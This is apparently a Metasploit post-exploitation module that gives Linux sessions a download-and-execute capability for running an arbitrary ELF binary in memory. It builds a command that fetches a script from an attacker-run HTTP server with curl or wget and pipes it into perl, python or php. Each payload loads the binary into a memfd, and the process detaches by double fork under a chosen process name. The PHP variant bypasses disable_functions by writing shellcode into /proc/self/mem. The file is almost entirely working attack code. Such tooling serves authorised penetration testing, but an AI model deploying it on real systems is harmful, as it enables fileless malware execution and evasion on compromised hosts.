##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Linux::System
  include Msf::Exploit::Remote::HttpServer::HTML

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Linux Manage Download and Execute ELF in memory',
      'Description'   => %q{
        This module downloads and runs script, which contains ELF and execution technique. It first tries to uses curl as
        its HTTP client and then wget if it's not found. Perl or Python found in the PATH is used
        to execute script.
      },
      'License'       => MSF_LICENSE,
      'Author'        =>
        [
          'Mikhail Firstov <mfirstov[at]fbkcs.com>',
          'Yaroslav Moskvin <ymoskvin[at]fbkcs.com>',
          'Sergey Migalin <smigalin[at]fbkcs.com>',
          'Skuratov Andrey <askuratov[at]fbkcs.com>',
          'Anonymous'
        ],
      'Platform'      => ['linux'],
      'SessionTypes'  => ['shell', 'meterpreter']
      ))

    register_options(
      [
        OptString.new('FILE', [true, 'Full path to ELF file you want execute.']),
        OptString.new('ARGS', [false, 'Execution arguments.']),
        OptString.new('NAME', [true, 'Process name.']),
        OptString.new('VECTOR', [false, 'Preferred script interpreter ( php | python | perl ).']),
        OptInt.new('HTTPDELAY',    [false, 'Number of seconds the web server will wait before termination.', 15])
      ], self.class)
  end

  def cmd_exec_vprint(cmd)
    vprint_status("Executing: #{cmd}")
    output = cmd_exec(cmd)
    if output.length > 0
      vprint_status("#{output}")
    end
    return
  end

  def exists_exe?(exe)
    vprint_status "Searching for #{exe} in the current $PATH..."
    path = get_env("PATH")
    if path.nil? or path.empty?
      return false
      vprint_error "No local $PATH set!"
    else
      vprint_status "$PATH is #{path.strip!}"
    end

    path.split(":").each{ |p|
      full_path = p + "/" + exe
      vprint_status "Searching for '#{full_path}' ..."
      return true if file_exist?(full_path)
    }

    return false
  end

  def search_http_client
    print_status("Checking if curl exists in the path...")
    if exists_exe?("curl")
      print_good("curl available, using it")
      @stdout_option = ""
      @http_client = "curl"
      @ssl_option = "-k"
      return
    end

    print_status("Checking if wget exists in the path...")
    if exists_exe?("wget")
      print_good("wget available, using it")
      @http_client = "wget"
      @stdout_option =  "-O-"
      @ssl_option = "--no-check-certificate"
      return
    end
  end

  def search_shell

    if datastore['VECTOR']
      print_status("Checking if #{datastore['VECTOR']} exists in the path...")
      if exists_exe?(datastore['VECTOR'])
        print_good("#{datastore['VECTOR']} available, using it")
        @shell = datastore['VECTOR']
        return
      else
        print_warning("There is no #{datastore['VECTOR']} available in the $PATH, aborting...")
      end
    end

    print_status("Checking if perl exists in the path...")
    if exists_exe?("perl")
      print_good("perl available, using it")
      @shell = "perl"
      return
    end

    print_status("Checking if python exists in the path...")
    if exists_exe?("python")
      print_good("python available, using it")
      @shell = "python"
      return
    end

    print_status("Checking if php exists in the path...")
    if exists_exe?("php")
      print_good("php available, using it")
      @shell = "php"
      return
    end
  end


  def php_payload
    @elf_payload = ''
    elf = @binary.each_slice(2) {|sl| @elf_payload += "\\x" + sl.inject('') {|memo, byte| memo << [byte].pack('C+')}  }
    <<~END
    <?php
    ///////////////////////////////////////////////////////////////////////
    // Parameters
    ///////////////////////////////////////////////////////////////////////
    $elf = "#{@elf_payload}";   // 
    $args = "#{datastore['NAME']} #{datastore['ARGS']}";                // 


    function packlli($value) {
        $higher = ($value & 0xffffffff00000000) >> 32;
        $lower = $value & 0x00000000ffffffff;
        return pack('V2', $lower, $higher);
    }

    function unp($value) {
        return hexdec(bin2hex(strrev($value)));
    }

    function parseelf($bin_ver, $rela = false) {
        $bin = file_get_contents($bin_ver);
        
        $e_shoff = unp(substr($bin, 0x28, 8));
        $e_shentsize = unp(substr($bin, 0x3a, 2));
        $e_shnum = unp(substr($bin, 0x3c, 2));
        $e_shstrndx = unp(substr($bin, 0x3e, 2));

        for($i = 0; $i < $e_shnum; $i += 1) {
            $sh_type = unp(substr($bin, $e_shoff + $i * $e_shentsize + 4, 4));
            if($sh_type == 11) { // SHT_DYNSYM
                $dynsym_off = unp(substr($bin, $e_shoff + $i * $e_shentsize + 24, 8));
                $dynsym_size = unp(substr($bin, $e_shoff + $i * $e_shentsize + 32, 8));
                $dynsym_entsize = unp(substr($bin, $e_shoff + $i * $e_shentsize + 56, 8));
            }
            elseif(!isset($strtab_off) && $sh_type == 3) { // SHT_STRTAB
                $strtab_off = unp(substr($bin, $e_shoff + $i * $e_shentsize + 24, 8));
                $strtab_size = unp(substr($bin, $e_shoff + $i * $e_shentsize + 32, 8));
            }
            elseif($rela && $sh_type == 4) { // SHT_RELA
                $relaplt_off = unp(substr($bin, $e_shoff + $i * $e_shentsize + 24, 8));
                $relaplt_size = unp(substr($bin, $e_shoff + $i * $e_shentsize + 32, 8));
                $relaplt_entsize = unp(substr($bin, $e_shoff + $i * $e_shentsize + 56, 8));
            }
        }

        if($rela) {
            for($i = $relaplt_off; $i < $relaplt_off + $relaplt_size; $i += $relaplt_entsize) {
                $r_offset = unp(substr($bin, $i, 8));
                $r_info = unp(substr($bin, $i + 8, 8)) >> 32;
                $name_off = unp(substr($bin, $dynsym_off + $r_info * $dynsym_entsize, 4));
                $name = '';
                $j = $strtab_off + $name_off - 1;
                while($bin[++$j] != "\\0") {
                    $name .= $bin[$j];
                }
                if($name == 'open') {
                    return $r_offset;
                }
            }
        }
        else {
            for($i = $dynsym_off; $i < $dynsym_off + $dynsym_size; $i += $dynsym_entsize) {
                $name_off = unp(substr($bin, $i, 4));
                $name = '';
                $j = $strtab_off + $name_off - 1;
                while($bin[++$j] != "\\0") {
                    $name .= $bin[$j];
                }
                if($name == '__libc_system') {
                    $system_offset = unp(substr($bin, $i + 8, 8));
                }
                if($name == '__open') {
                    $open_offset = unp(substr($bin, $i + 8, 8));
                }
            }
            return array($system_offset, $open_offset);
        }
    }


    echo "[INFO] ELF in-memory execution script\\n";

    ///////////////////////////////////////////////////////////////////////
    // Emulates PHP version macros (for <5.2.7)
    ///////////////////////////////////////////////////////////////////////
    if (!defined('PHP_VERSION_ID')) {
        $version = explode('.', PHP_VERSION);
        define('PHP_VERSION_ID', ($version[0] * 10000 + $version[1] * 100 + $version[2]));
    }
    if (PHP_VERSION_ID < 50207) {
        define('PHP_MAJOR_VERSION',   $version[0]);
        define('PHP_MINOR_VERSION',   $version[1]);
        define('PHP_RELEASE_VERSION', $version[2]);
    }
    echo "[INFO] PHP major version " . PHP_MAJOR_VERSION . "\\n";

    ///////////////////////////////////////////////////////////////////////
    // Verifications
    ///////////////////////////////////////////////////////////////////////
    echo "[*] PHP disable_functions bypass (coded by Beched, RDot.Org)\\n";
    if(strpos(php_uname('a'), 'x86_64') === false) {
        echo "[-] This exploit is for x64 Linux. Exiting\\n";
        exit;
    }

    if(substr(php_uname('r'), 0, 4) < 2.98) {
        echo "[-] Too old kernel (< 2.98). Might not work\\n";
    }

    ///////////////////////////////////////////////////////////////////////
    // Find addresses
    ///////////////////////////////////////////////////////////////////////
    echo "[INFO] Trying to get open@plt offset in PHP binary\\n";
    $open_php = parseelf('/proc/self/exe', true);
    if($open_php == 0) {
        echo "[-] Failed. Exiting\\n";
        exit;
    }

    echo '[+] Offset is 0x' . dechex($open_php) . "\\n";
    $maps = file_get_contents('/proc/self/maps');

    preg_match('#\\s+(/.+libc\\-.+)#', $maps, $r);
    echo "[INFO] Libc location: $r[1]\\n";

    preg_match('#\\s+(.+\\[stack\\].*)#', $maps, $m);
    $stack = hexdec(explode('-', $m[1])[0]);
    echo "[INFO] Stack location: ".dechex($stack)."\\n";


    $pie_base = hexdec(explode('-', $maps)[0]);
    echo "[INFO] PIE base: ".dechex($pie_base)."\\n";

    echo "[INFO] Trying to get open and system symbols from Libc\\n";
    list($system_offset, $open_offset) = parseelf($r[1]);
    if($system_offset == 0 or $open_offset == 0) {
        echo "[-] Failed. Exiting\\n";
        exit;
    }

    ///////////////////////////////////////////////////////////////////////
    // Rewrite open function
    ///////////////////////////////////////////////////////////////////////
    echo "[+] Got them. Seeking for address in memory\\n";
    $mem = fopen('/proc/self/mem', 'rb');
    fseek($mem, ((PHP_MAJOR_VERSION == 7) * $pie_base) + $open_php);

    $open_addr = unp(fread($mem, 8));
    echo '[INFO] open@plt addr: 0x' . dechex($open_addr) . "\\n";

    echo "[INFO] Rewriting open@plt address\\n";
    $mem = fopen('/proc/self/mem', 'wb');


    ///////////////////////////////////////////////////////////////////////
    // Run ELF in memory
    ///////////////////////////////////////////////////////////////////////

    // create anonymous file
    $shellcode_loc = $pie_base + 0x100;
    $shellcode = "\\x48\\x31\\xD2\\x52\\x54\\x5F\\x6A\\x01\\x5E\\x68\\x3F\\x01\\x00\\x00\\x58\\x0F\\x05\\x5A\\xC3";
    fseek($mem, $shellcode_loc);
    fwrite($mem, $shellcode);

    fseek($mem, (PHP_MAJOR_VERSION == 7) * $pie_base + $open_php);
    fwrite($mem, packlli($shellcode_loc));

    echo "[+] Address written. Executing cmd\\n";
    $fp = fopen('fd', 'w');
    // write elf to anonymous file
    fwrite($fp, $elf);

    // find file descriptor number
    $found = false;
    $fds = scandir("/proc/self/fd");
    foreach($fds as $fd) {
        $path = "/proc/self/fd/$fd";
        if(!is_link($path)) continue;
        if(strstr(readlink($path), "memfd")) {
            $found = true;
            break;
        }
    }
    if(!$found) {
        echo '[-] memfd not found';
        exit;
    }

    fseek($mem, $stack);
    // write path to elf into stack
    fwrite($mem, "{$path}\\x00");
    $filename_ptr = $stack;
    $stack += strlen($path) + 1;

    fseek($mem, $stack);
    // write arguments to stack
    fwrite($mem, str_replace(" ", "\\x00", $args) . "\\x00");

    $str_ptr = $stack;
    $argv_ptr = $arg_ptr = $stack + strlen($args) + 1;
    foreach(explode(' ', $args) as $arg) {
        fseek($mem, $arg_ptr);
        fwrite($mem, packlli($str_ptr));

        $arg_ptr += 8;
        $str_ptr += strlen($arg) + 1;
    }
    fseek($mem, $arg_ptr);
    fwrite($mem, packlli(0x0));

    echo "[INFO] Argv: " . $args . "\\n";
    // fork -> execle
    echo "[+] Starting ELF\\n";
    $shellcode = "\\x6a\\x39\\x58\\x0f\\x05\\x85\\xc0\\x75\\x28\\x6a\\x70\\x58\\x0f\\x05\\x6a\\x39\\x58\\x0f\\x05\\x85\\xc0\\x75\\x1a\\x48\\xbf" 
                . packlli($filename_ptr) 
                . "\\x48\\xbe" 
                . packlli($argv_ptr) 
                . "\\x48\\x31\\xd2\\x6a\\x3b\\x58\\x0f\\x05\\xc3\\x6a\\x00\\x5f\\x6a\\x3c\\x58\\x0f\\x05";


    fseek($mem, $shellcode_loc);
    fwrite($mem, $shellcode);
    fopen('done', 'r');
    exit();

    ?>
    END
  end


  def perl_payload
    elf_payload = ''
    elf = @binary.each_slice(64) {|sl| elf_payload += 'print $FH pack q/H*/, q/' + sl.inject('') {|memo, byte| memo << [byte].pack('C+')} + "/ or die qq/write: $!/;\n" }
    <<~END
      my $name = "";
      my $fd = syscall(319, $name, 1);
      if (-1 == $fd) {
           die "memfd_create: $!";
      }
      open(my $FH, '>&=' .$fd) or die 'open: &!';
      select((select($FH), $|=1)[0]);

      #{elf_payload}

      while ($keep_going) {
              my $pid = fork();
              if (-1 == $pid) { # Error
                     die "fork: \$!";
              }
              if (0 == $pid) { # Child
                      # Do child things here
                      exit 0;
              }
      }
      # Spawn child
      my $pid = fork();
      if (-1 == $pid) { # Error
              die "fork1: \$!";
      }
      if (0 != $pid) { # Parent terminates
              exit 0;
      }
      # In the child, become session leader
      if (-1 == syscall(112)) {
             die "setsid: $!";
      }
      # Spawn grandchild
      $pid = fork();
      if (-1 == $pid) { # Error
              die "fork2: $!";
      }
      if (0 != $pid) { # Child terminates
              exit 0;
      }
      # In the grandchild here, do grandchild things
      exec {"/proc/$$/fd/$fd"} "#{datastore['NAME']}", #{@args} or die "exec: $!";
    END
  end

  def python_payload
    elf_payload = ''
    elf = @binary.each_slice(64) {|sl| elf_payload += "elf += '" + sl.inject('') {|memo, byte| memo << [byte].pack('C+')} + "\'\n" }
    <<~END
      import ctypes
      import os
      import binascii

      elf = ""
      #{elf_payload}
      binary = binascii.unhexlify(elf)

      fd = ctypes.CDLL(None).syscall(319,"",1)
      final_fd = open("/proc/self/fd/"+str(fd),"wb")
      final_fd.write(binary)
      final_fd.close()

      fork1 = os.fork()
      if 0 != fork1: os._exit(0)

      ctypes.CDLL(None).syscall(112)

      fork2 = os.fork()
      if 0 != fork2: os._exit(0)

      os.execl("/proc/self/fd/"+str(fd),"#{datastore['NAME']}",#{@args})
    END
  end

  def primer

    search_http_client

    if not @http_client
      print_warning("neither curl nor wget available in the $PATH, aborting...")
      return
    end

    search_shell

    if not @shell
      print_warning("neither perl, python nor php available in the $PATH, aborting...")
      return
    end

    file = File.open(datastore['FILE'], "rb")
    contents = file.read
    file.close

    @binary = contents.unpack("H*")[0].bytes

    if datastore['ARGS'].nil?
      @args = ""
    else
      @args = datastore['ARGS'].split(' ').map! {|elem| '"' + elem + '"'}.join(', ')
    end

    if @shell == "perl"
      @final_payload = perl_payload
    elsif @shell == "python"
      @final_payload = python_payload
    elsif @shell == "php"
      @final_payload = php_payload
    end
    
    if get_uri.match(%r{^https://})
      cmd_exec_vprint("#{@http_client} #{@stdout_option} #{@ssl_option} #{get_uri} 2>/dev/null | #{@shell}")
    else
      cmd_exec_vprint("#{@http_client} #{@stdout_option} #{get_uri} 2>/dev/null | #{@shell}")
    end


  end

  def on_request_uri(cli, request)
     print_status("Client requests URI: #{request.uri}")
     send_response(cli, @final_payload)
  end

  def exploit
    begin
      Timeout.timeout(datastore['HTTPDELAY']) { super }
    rescue Timeout::Error
      # When the server stops due to our timeout, this is raised
    end
  end


  def run

       exploit

  end
end
